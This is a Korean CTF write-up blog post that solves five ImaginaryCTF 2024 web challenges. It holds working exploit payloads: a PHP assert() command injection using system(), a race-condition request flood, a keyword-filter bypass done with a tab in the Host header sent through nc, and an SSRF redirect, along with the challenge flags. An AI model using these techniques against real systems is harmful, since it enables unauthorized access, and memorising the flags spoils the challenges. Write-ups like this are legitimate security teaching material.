---
layout: post
title: ImaginaryCTF 2024
description: CTF Write-up
tags: ImaginaryCTF 
category: ctf
---   
     
# ImaginaryCTF

## 대회 일정
**2024-07-20 04:00 ~ 2024-07-22 04:00**
     
## 대회 후기       
      
<img src="/assets/images/ctf/2024/imaginary/scoreboard.jpg" width="700px">           
        


## Writeup     
     
- <a href="#readme">readme</a>     
- <a href="#journal">p2c</a> 
- <a href="#crystals">crystals</a>    
- <a href="#The-Amazing-Race">The-Amazing-Race</a>    
- <a href="#readme2">readme2</a>   
     
<a id="readme"></a>          

# readme     
           
978 solved / 100 pts          
     
```Dockerfile
FROM node:20-bookworm-slim

RUN apt-get update \
    && apt-get install -y nginx tini \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

WORKDIR /app
COPY package.json yarn.lock ./
RUN yarn install --frozen-lockfile
COPY src ./src
COPY public ./public

COPY default.conf /etc/nginx/sites-available/default
COPY start.sh /start.sh

ENV FLAG="ictf{path_normalization_to_the_rescue}"

ENTRYPOINT ["/usr/bin/tini", "--"]
CMD ["/start.sh"]
```
도커 파일을 열면, 플래그가 존재한다...(?)     
                       
```nginx
server {
    listen       80 default_server;
    listen  [::]:80;
    root /app/public;

    location / {
        if (-f $request_filename) {
            return 404;
        }
        proxy_pass http://localhost:8000;
    }
}
```      
nginx에서 `/` 뒤에 요청하는 파일을 직접적으로 접근이 불가능하도록 막아두어 `/flag.txt/.` 요청을 보내 푸는 문제였다고 한다.    
     
<img src="/assets/images/ctf/2024/imaginary/readme/discord.jpg" width=700px>     
               
### Exploit Code   
```bash
curl --path-as-is 'http://readme.chal.imaginaryctf.org/flag.txt/.'
```                
     
### Flag      
ictf{path_normalization_to_the_rescue}         
       
<a id="journal"></a>          

# journal     
           
518 solved / 100 pts        
       
```Dockerfile
FROM php:7-apache

RUN /usr/sbin/useradd -u 1000 user

COPY index.php /var/www/html/
RUN chown -R www-data:www-data /var/www/html && \
    chmod -R 444 /var/www/html && \
    chmod 555 /var/www/html

COPY flag.txt /flag.txt
COPY files /var/www/html/files/
RUN mv /flag.txt /flag-`tr -dc A-Za-z0-9 < /dev/urandom | head -c 20`.txt

VOLUME /var/log/apache2
VOLUME /var/run/apache2

CMD bash -c 'source /etc/apache2/envvars && APACHE_RUN_USER=user APACHE_RUN_GROUP=user /usr/sbin/apache2 -D FOREGROUND'
```       
flag.txt 파일을 flag-random-number 형태로 파일 명을 변경한다. RCE를 통해 파일 명을 알아내야한다.   
            
```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");

  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";
```          

`assert()` 함수에서 PHP 코드를 실행시킬 수 있어 유저 입력으로 `'.system('').'`를 입력하면 `strpos(''.system('').'','..') === false` 구문이 되어 `system('')`을 실행한 결과가 `strpos()` 함수의 첫 번째 인자에 들어가게 된다. 명령을 입력해 플래그 값을 읽어내면 된다.            
     
### Exploit Code    

<img src="/assets/images/ctf/2024/imaginary/journal/ls.jpg" width=700px>            
              
<img src="/assets/images/ctf/2024/imaginary/journal/flag.jpg" width=700px>            
                    
### Flag      
ictf{assertion_failed_e3106922feb13b10}       
         
<a id="crystals"></a>          

# crystals     
           
145 solved / 100 pts               
      
```yml
version: '3.3'
services:
  deployment:
    hostname: $FLAG
    build: .
    ports:
      - 10001:80
```      
docker-compose.yml 파일을 보면, hostname 값이 플래그로 설정되어있다. hostname 값을 알아내기 위해 `Bad Request` 요청을 보내니 플래그를 얻을 수 있었다.         
       
### Exploit Code    
      
<img src="/assets/images/ctf/2024/imaginary/crystals/flag.jpg" width=700px>          
      
### Flag      
ictf{seems_like_you_broke_it_pretty_bad_76a87694}      

<a id="The-Amazing-Race"></a>          

# The Amazing Race     
           
100 solved / 100 pts               
         
```python
from flask import Flask, redirect, render_template, Response, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from sqlite3 import *
from uuid import uuid4
from time import sleep

from maze import Maze

app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    storage_uri="memory://",
)

MAZE_SIZE = 35   
       
def initDb():
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS mazes(
            id TEXT PRIMARY KEY, 
            maze TEXT NOT NULL,
            row INTEGER NOT NULL DEFAULT 0,
            col INTEGER NOT NULL DEFAULT 0,
            up BOOL NOT NULL DEFAULT False,
            down BOOL NOT NULL DEFAULT True,
            left BOOL NOT NULL DEFAULT False,
            right BOOL NOT NULL DEFAULT True
            )
    ''')
    con.commit()
    cur.close()
    con.close()     
                
def createMaze():
    mazeId = str(uuid4())
    maze = Maze(2, MAZE_SIZE)

    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        INSERT INTO mazes (id, maze)
        VALUES (?, ?)
    ''', (mazeId, str(maze).strip()))
    con.commit()
    cur.close()
    con.close()
    return mazeId

def getLoc(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT row, col FROM mazes WHERE id = ?", (mazeId,)).fetchone()
    cur.close()
    con.close()
    return ret

...

@app.route("/", defaults={"mazeId": None})
@app.route("/<mazeId>")
def index(mazeId):
    if not mazeId:
        return redirect(f"/{createMaze()}")
    solved=getLoc(mazeId) == (MAZE_SIZE-1, MAZE_SIZE-1)
    return render_template("maze.html", 
        maze=getMaze(mazeId), 
        mazeId=mazeId,
        flag=open("flag.txt").read() if solved else ""
    )
      
...

initDb()
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=7000)
```         
          
`/` 엔드포인트에 접근하면, 미로를 생성한다. 시작 위치는 (0, 0) 이며 도착 지점은 (34, 34)이다. 도착 지점에 도달하면 플래그 값을 반환한다.     

```python
class Maze:
    ...

    def gen(self): 
        ...

        self.set(*([0]*self.dim), val='@')
        for i in self.neighbors(*([0]*self.dim)):
            self.set(*i, val='.')

        self.set(*([self.size-1]*self.dim), val='F')
        for i in self.neighbors(*([self.size-1]*self.dim)):
            self.set(*i, val='#')
```       
미로 생성 로직을 보면, 시작 위치 (0, 0) 주변에 `.`(땅)을 놓고 도착 위치 (34, 34) 주변에 `#`(벽)을 놓아 도착 위치에 도달할 수 없도록 막아두었다.     
       
```python
def getMaze(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT maze FROM mazes WHERE id = ?", (mazeId,)).fetchone()[0]
    cur.close()
    con.close()
    return ret

def getLoc(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT row, col FROM mazes WHERE id = ?", (mazeId,)).fetchone()
    cur.close()
    con.close()
    return ret

def getCanMove(mazeId):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    ret = cur.execute("SELECT up, down, left, right FROM mazes WHERE id = ?", (mazeId,)).fetchone()
    cur.close()
    con.close()
    return ret

def writeMaze(mazeId, maze):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        UPDATE mazes SET maze = ? WHERE id = ?
    ''', (maze, mazeId))
    con.commit()
    cur.close()
    con.close()

def writeLoc(mazeId, loc):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        UPDATE mazes SET row = ?, col = ? WHERE id = ?
    ''', (*loc, mazeId))
    con.commit()
    cur.close()
    con.close()

def writeCanMove(mazeId, canMove):
    con = connect("/tmp/mazes.db")
    cur = con.cursor()
    cur.execute('''
        UPDATE mazes SET up = ?, down = ?, left = ?, right = ? WHERE id = ?
    ''', (*canMove, mazeId))
    con.commit()
    cur.close()
    con.close()

def bound(n, mn=0, mx=MAZE_SIZE):
    return max(min(n, mx), mn)

def inn(n, mn = 0, mx = MAZE_SIZE):
    return mn <= n < mx 

@app.route("/move", methods=["POST"])
def move():
    mazeId = request.args["id"]
    moveStr = request.args["move"]

    canMove = getCanMove(mazeId)
    validMoves = ["up", "down", "left", "right"]
    moveIdx = None
    if moveStr in validMoves:
        moveIdx = validMoves.index(moveStr)
    validMovesDict = {"up": (-1, 0), "down": (1, 0), "left": (0, -1), "right": (0, 1)}
    move = validMovesDict.get(moveStr, None)
    if not move or moveIdx is None or not canMove[moveIdx]:
        return redirect(f"/{mazeId}")

    currentLoc = getLoc(mazeId)
    newLoc = [bound(currentLoc[0] + move[0]), bound(currentLoc[1] + move[1])]

    writeLoc(mazeId, newLoc)

    mazeStr = getMaze(mazeId)
    maze = [[c for c in row] for row in mazeStr.splitlines()]
    maze[currentLoc[0]][currentLoc[1]] = '.'
    maze[newLoc[0]][newLoc[1]] = '@'
    writeMaze(mazeId, '\n'.join(''.join(row) for row in maze))

    newCanMove = []
    for dr, dc in [(-1, 0), (1, 0), (0, -1), (0, 1)]:
        checkLoc = [newLoc[0] + dr, newLoc[1] + dc]
        newCanMove.append(
            inn(checkLoc[0]) and inn(checkLoc[1])
            and maze[checkLoc[0]][checkLoc[1]] != '#'
        )
    writeCanMove(mazeId, newCanMove)

    return redirect(f"/{mazeId}")
```      
       
`/move` 엔드포인트를 분석해보면, 유저로부터 이동할 방향을 전달받아 `#`(벽)이 아닌 경우에 이동한다.    
     
`@`(유저 위치)는 `writeLoc()`에 의해 지정되는데 인접한 경로에 갔을 때 주변을 이동할 수 있는지 `newCanMove` 리스트에 저장되며 `writeCanMove()`를 호출하여 데이터베이스에 업데이트한다.     
        
예를 들어, (3, 3) 위치에서 오른쪽으로 이동하려고 할 떄, (3, 4)에서 이동할 수 있는 인접한 경로들을 `newCanMove` 리스트에 저장한다. (3, 4)에 인접한 (-2, 4), (4, 4), (3, 3), (3, 5) 위치에 이동 가능 여부를 0 또는 1로 설정한다.    
   
```python
if not move or moveIdx is None or not canMove[moveIdx]:
    return redirect(f"/{mazeId}")
```
다음 이동 때, `canMove[moveIdx]`를 통해 이전에 설정한 값으로 이동 가능 여부를 판단하고 이동하게 된다. 
      
하지만, 여러 요청을 보내 `writeCanMove()` 함수가 호출되기 전에 새로운 요청에 대해 `writeLoc()` 함수가 처리되면 `#` (벽)을 지날 수 있게되어 도착 지점에 도달할 수 있다.          

### Exploit Code     
                
새로운 UUID 값을 받을 때마다 미로가 달라진다. 그렇기 때문에 BFS 알고리즘을 사용해 도착 지점 대각선에 위치한 (33, 33)까지는 자동으로 가도록 구현했다.   

```python
import requests
import copy 
from collections import deque

MAZE_SIZE = 35
visited = [[0] * MAZE_SIZE for _ in range(MAZE_SIZE)]

dx = [-1, 0, 1, 0]
dy = [ 0, 1, 0,-1]
dir = [ 'L', 'D', 'R', 'U']
curr_y, curr_x = 0, 1 

id = "fbb96d75-3d61-471f-9233-c63548c1b743"
url = f"http://the-amazing-race.chal.imaginaryctf.org"
# url = f"http://localhost:7000"

def move(path): 
    # path.append("D")
    # path.append("R")
    dr = {"L": "left", "D": "down", "R": "right", "U": "up"}
    for x in path:
        r = requests.post(
            f"{url}/move?id={id}&move={dr[x]}", 
        )
        # print(r.status_code)
        # print(r.text) 
        assert r.status_code == 200
    print("Done")
    r = requests.get(
        f"{url}/{id}"
    )
    print(r.text)

r = requests.get(
    f"{url}/{id}"
)

maze = r.text[ r.text.find("<code>")+7 : r.text.find("</code>")-1 ]
mat = [[] for _ in range(MAZE_SIZE)]
i = 0
for j in range(len(maze)):
    if maze[j] == "\n": 
        i = i + 1
        continue
    mat[i].append(maze[j])
maze = mat 

for i in range(len(mat)): 
    for j in range(len(mat[i])): 
        print(mat[i][j], end='')
    print()
    

d = deque([[0, 0, []]])
visited[0][0] = 1

while len(d) != 0: 
    curr = d.popleft() 
    curr_y, curr_x, path = curr[0], curr[1], curr[2]

    if curr_y == MAZE_SIZE - 2 and curr_x == MAZE_SIZE - 2: 
        print(path)
        move(path) 
        break 

    for k in range(4): 
        next_y = curr_y + dy[k]
        next_x = curr_x + dx[k] 

        if next_x < 0 or next_y < 0 or next_y >= MAZE_SIZE - 1 or next_x >= MAZE_SIZE - 1: continue 
        if visited[next_y][next_x] or maze[next_y][next_x] == '#': continue 
        visited[next_y][next_x] = 1
        new_path = copy.deepcopy(path) 
        new_path.append(dir[k])
        d.append([next_y, next_x, new_path])

for i in range(len(mat)): 
    for j in range(len(mat[i])): 
        print(visited[i][j], end='')
    print()
```                

이후, (33, 33) 위치에서 (34, 34) 도착 지점과 2, 3칸 떨어진 (30, 34) 위치로 이동했다. 그 이유는 (33, 33)에 위치하면 데이터베이스에 left, right, up, down 값이 반영되어있어 벽을 이동할 수 없기 때문이다. 
       
그래서, 도착 위치에서 조금 떨어진 (30, 34) 또는 (31, 34)에서 Race Condition을 시도했다.    

```javascript
async function gogo(id) {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/move?id=" + id + "&move=down", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = () => {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            console.log(xhr.responseText);
        }
    };
    xhr.send("");
}

for (let i = 0; i < 5; i++) {
    gogo("fbb96d75-3d61-471f-9233-c63548c1b743");
    gogo("fbb96d75-3d61-471f-9233-c63548c1b743");
}
```               
콘솔에서 스크립트를 실행시키고 Down 버튼 또한 같이 눌러 여러 요청을 보내 문제를 해결할 수 있었다.       
        
<img src="/assets/images/ctf/2024/imaginary/the-amazing-race/flag.png" width="700px"/>           
                     
### Flag
ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}             
                        
                                
<a id="readme2"></a>            
      
# readme2     
             
56 solved / 100 pts                 
                                        
```javascript
const flag = process.env.FLAG || 'ictf{this_is_a_fake_flag}'

Bun.serve({
	async fetch(req) {
		const url = new URL(req.url)
		if (url.pathname === '/') return new Response('Hello, World!')
		if (url.pathname.startsWith('/flag.txt')) return new Response(flag)
		return new Response(`404 Not Found: ${url.pathname}`, { status: 404 })
	},
	port: 3000
})

Bun.serve({
	async fetch(req) {
		if (req.url.includes('flag')) return new Response('Nope', { status: 403 })
		const headerContainsFlag = [...req.headers.entries()].some(([k, v]) => k.includes('flag') || v.includes('flag'))
		if (headerContainsFlag) return new Response('Nope', { status: 403 })
		const url = new URL(req.url)

		if (url.href.includes('flag')) return new Response('Nope', { status: 403 })
		return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), {
			method: req.method,
			headers: req.headers,
			body: req.body
		})
	},
	port: 4000 // only this port are exposed to the public
})
```                   
       
`/flag.txt` 요청을 보내면, 플래그를 획득할 수 있다. 하지만, URL 경로나 HTTP Header에 `flag` 키워드를 넣을 수 없도록 제한되어있어 이를 우회해야한다.      

```javascript
new URL("//foo.com", "https://example.com"); 
// => 'https://foo.com' (see relative URLs)
```       
            
https://developer.mozilla.org/ko/docs/Web/API/URL/URL    
       
MDN에서 `new URL()`에 대해 찾아보니 위와 같은 예시가 있었다. `new URL()`에서 baseURL로 `https://example.com`를 설정하였더라도, `//`를 사용해 다른 호스트로 요청을 보낼 수 있다는 것이다.           
       
그래서, `//server-ip`로 요청을 보내 응답 헤더를 `Location: http://localhost:3000/flag.txt`로 설정해 리다이렉션시켜 SSRF 취약점을 발생시켰다. 이 방법으로 문제를 해결했지만, 대회가 끝나고 나서 언인텐임을 알게 되었다.              
        
<img src="/assets/images/ctf/2024/imaginary/readme2/discord.jpg" width=700px>       
                
```bash
printf 'GET /.. HTTP/1.0\r\nHost: fakehost/fla\tg.txt\r\n\r\n' | nc readme2.chal.imaginaryctf.org 80
```        
의도한 풀이는 `Host Header`에 `/flag.txt`를 넣고 `\t`으로 `flag` 키워드를 우회하는 것이었다. 이 방식이 우회가 가능한 이유는 `whatwg's url parsing algorithm`에서 `\t`를 무시하고 처리하기 때문이다. 

### Exploit Code     

```php
<?php
    header("Location: http://127.0.0.1:3000/flag.txt");
?>
```                 
```bash      
curl http://readme2.chal.imaginaryctf.org//server-ip 
```      
      
<img src="/assets/images/ctf/2024/imaginary/readme2/flag.jpg" width=700px>       
      
### Flag 
ictf{just_a_funny_bug_in_bun_http_handling}    